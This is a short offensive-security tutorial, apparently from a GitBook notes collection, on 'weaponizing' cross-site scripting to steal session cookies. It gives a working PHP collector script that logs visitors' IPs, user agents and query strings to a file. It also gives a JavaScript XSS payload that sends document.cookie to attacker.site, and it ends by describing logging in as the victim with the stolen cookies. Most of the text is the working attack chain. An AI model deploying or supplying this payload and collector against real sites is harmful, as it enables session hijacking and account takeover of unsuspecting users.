---
description: Weaponizing XSS
---

# XSS cookie stealing

## get.php 

To store cookie on machine.

```php
<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

# opens a logfile where we save the query
$fp = fopen('jar.txt','a');

fwrite($fp, $ip.' '.$browser."\n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fclose($fp);
?>
```

Using the PHP file above, if we make a GET request with the following param below, the `hereismydata` value gets stored in the `jar.txt` defined above 

```text
attacker.site/get.php?test=hereismydata
```

Using this, we can weaponize the XSS by crafting a payload to send the victim's cookies into the website. And then navigating to `attacker.site/jar.txt` we will see anyone who has cookies stolen.

```javascript
<script> var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
//the escape function helps prevent breaking the statement
```

If a victim triggers the XSS payload, the private cookies would be stolen and sent to the jar.txt file.

![](../.gitbook/assets/image%20%2860%29.png)

We can then use the cookies and impersonate as the user to login.

